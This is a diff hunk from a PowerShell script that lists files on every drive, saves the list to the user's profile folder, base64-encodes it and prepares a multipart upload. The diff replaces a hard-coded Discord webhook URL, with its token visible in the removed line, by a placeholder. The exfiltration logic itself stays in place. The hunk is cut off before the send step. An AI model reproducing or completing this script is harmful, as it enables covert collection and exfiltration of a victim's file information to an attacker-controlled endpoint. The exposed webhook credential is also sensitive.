@@ -9,7 +9,7 @@ foreach ($drive in $drives) {
 $outputFile = Join-Path -Path $env:USERPROFILE -ChildPath "FilesList.txt"
 $files.FullName | Out-File -FilePath $outputFile
 Write-Host "File list saved to: $outputFile"
-$webhookURL = "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+$webhookURL = "????"
 $fileContent = Get-Content -Path $outputFile -Raw
 $fileContentBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
 $boundary = [System.Guid]::NewGuid().ToString()
